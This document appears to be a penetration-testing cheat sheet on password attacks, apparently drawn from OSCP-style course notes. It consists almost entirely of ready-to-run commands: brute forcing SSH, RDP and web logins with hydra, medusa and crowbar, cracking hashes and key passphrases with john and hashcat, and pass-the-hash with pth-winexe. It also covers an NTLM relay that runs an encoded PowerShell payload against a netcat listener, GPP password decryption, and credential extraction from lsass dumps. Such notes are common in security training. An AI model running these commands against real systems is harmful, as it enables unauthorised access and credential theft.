### Tips
```
1. Always try username as password.
2. Season + Year
3. Year + Season
```
### Cewl
```
cewl https://www.tesla.cn -v -a -m(min) 1 -w tesla.txt
```

### Crunch
```
crunch 8(min) 8(max) -t ,@@^^%%%

PLACEHOLDER	CHARACTER TRANSLATION
@	Lower case alpha characters
,	Upper case alpha characters
%	Numeric characters
^	Special characters including space

crunch 4 6 0123456789ABCDEF(char set) -o crunch.txt
```
### Medusa
###### HTTP htaccess Attack with Medusa
```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
medusa -d(check out supported modules)
```

### Crowbar
```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
### Hydra
>Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user(post_form_key)=admin&pass(post_form_key)=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f(stop the attack when the first successful result is found)
```
### Hash Identification
```
hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
hashid '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF3G0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'
```
### Passing the Hash in Windows
>Scenario:
>cracking password hashes can be very time-consuming and is often not feasible without powerful hardware. However, sometimes we can leverage Windows-based password hashes without resorting to a laborious cracking process.  
During our assessment, we discovered a local administrative account that is enabled on multiple systems. We exploited a vulnerability on one of these systems and have gained SYSTEM privileges, allowing us to dump local LM and NTLM hashes. We have copied the local administrator NTLM hash and can now use it instead of a password to gain access to a different machine, which has the same local administrator acount and password
```
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```
### Cryptography
```
$1$: MD5-based crypt ('md5crypt')  
$2$: Blowfish-based crypt ('bcrypt')[^bcrypt]  
$sha1$: SHA-1-based crypt ('sha1crypt')  
$5$: SHA-256-based crypt ('sha256crypt')  
$6$: SHA-512-based crypt ('sha512crypt')  
```
md5sum plain-text, sha1sum plain-text, sha256sum plain-text, sha512sum plain-text  
> https://crackstation.net/ (unsalted hash crack)  
###### Generate salted hash
mkpasswd -m sha512crypt foobar -S "M3vwJPAueK2a1vNM"

###### Symmetric
gpg -c --cipher-algo blowfish blowfish.plain  
gpg --decrypt blowfish.plain.gpg  
gpg -c --cipher-algo aes256 aes256.plain  
gpg --decrypt aes256.plain.gpg

###### Asymmetric 
> https://www.cs.drexel.edu/~jpopyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html  

gpg --gen-key(enter realname--Offsec and email--test@example.com for identification)  
gpg --output example-pub.asc --armor --export Offsec  
gpg --recipient Offsec --encrypt plain.txt  
gpg --decrypt plain.txt.gpg  
gpg --import melanie-private.asc  
gpg --decrypt decrypt-me.gpg(need to enter passphrase)  

###### John the ripper
john --wordlist=rockyou.txt hash  
john -form=dynamic='sha1(md5(sha512($p.$s).$p).$s)' --wordlist=rockyou.txt hash  
john --wordlist=rockyou.txt user_shadow_hash($6$VvN1wBiLLmqWtRXY$oPzxsQbXqdzIISj5NzmKeiUcfXGvFJzqi9YFCzOtdOOI4yOqXm.UBiP7oLeDH8kZUgCtwBwY.YcbqVx7RWlj51)  
john hash.txt --format=NT  
>We have two machines, each with an 8-core CPU. On the first machine we would set the --fork=8 and --node=1-8/16 options, instructing John to create eight processes on this machine, split the supplied wordlist into sixteen equal parts, and process the first eight parts locally. On the second machine, we could use --fork=8 and --node=9-16 to assign eight processes to the second half of the wordlist.

###### John crack shadow file
unshadow /etc/passwd /etc/shadow > unshadowed.txt  
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt  

### Hashcat
```
built-in charset
• ?l = abcdefghijklmnopqrstuvwxyz 
• ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
• ?d = 0123456789
• ?h = 0123456789abcdef
• ?H = 0123456789ABCDEF
• ?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
• ?a = ?l?u?d?s
• ?b = 0x00 - 0xff 

-w 1 (Light): Low workload intensity, suitable for background tasks.
-w 2 (Medium): A moderate workload intensity.
-w 3 (Normal): The default workload intensity.
-w 4 (Heavy): High workload intensity, which may heavily utilize system resources.
--hwmon-disable would prevent Hashcat from monitoring the GPU's temperature and fan speed

nvidia-smi -i [device-id-integer] -pl [power-level] drop nvidia max power
nvidia-smi -a | egrep '^GPU|  Power Limit|Default Power Limit|Power Draw' check current power limit
```
```
hashcat -a 0(dictionary) -m 13000 hash wordlist -O -w 1
```
###### Combine each char set(114) with each number(1000) = 114000
```
/usr/lib/hashcat-utils/combinator.bin flag2.txt numbers.txt > hash.txt
```
###### MS Cache v2 
```
From : k.smith:0A2503288EFD46133D4082305CF5D2EA:SKYLARK:SKYLARK.COM
To : Format: $DCC2$10240#user#hash
```
###### kdbx
```
keepass2john Database.kdbx > Keepasshash.txt
hashcat -a 0 -m 13400 hash dic 
```
###### nsldap, SHA-1(Base64), Netscape LDAP SHA
```
Format: {SHA}uJ6qx+YUFzQbcQtyd2gpTQ5qJ3s=
HashMode: 101
```
### Hash Identification
If contains special characters
```
hashid 'hash in here'
```
### Cracking ssh private key passphrase
Hashcat
```
ssh2john id_rsa > ssh.hash
```
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/21cf06d5-cdcf-42cd-8f8b-b6ffcebff5ae)

John
```
cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
```
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf' (add a name for the rules and append them to the /etc/john/john.conf)
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```
### Relaying Net-NTLMv2(when Net-NTLMv2 is too complex to crack)
> This is used when the user in files01 is an unprivileged user but is an local administrator account on files02

> Windows UAC will restrict any user accounts behaviour remotely other than the local administrator

>In this example we don't use the local Administrator user for the relay attack as we did for the pass-the-hash attack. Therefore, the target system needs to have UAC remote restrictions disabled or the command execution will fail. If UAC remote restrictions are enabled on the target then we can only use the local Administrator user for the relay attack. 
```
kali: impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA...(UTF-16LE base64 encoded payload)"
kali: nc -nvlp 8080
files01: dir \\192.168.119.2\test
```
### Cached GPP Password
>Search in C:\ProgramData\Microsoft\Group Policy\history or in C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history (previous to W Vista) for these files:
```
Groups.xml
Services.xml
Scheduledtasks.xml
DataSources.xml
Printers.xml
Drives.xml
```
Decrypting GPP Password
```
gpp-decrypt "gpp"
```
### PFX file
```
john pfx_file --wordlist=dic
```
### cracking lsass.dmp
```
pypykatz lsa minidump /home/kali/Desktop/forensic/memory_analysis/lsass.dmp
```
### cracking rdp dmp 
```
pypykatz rdp logonpasswords minidump /home/kali/Desktop/forensic/memory_analysis/winlogon.DMP
```
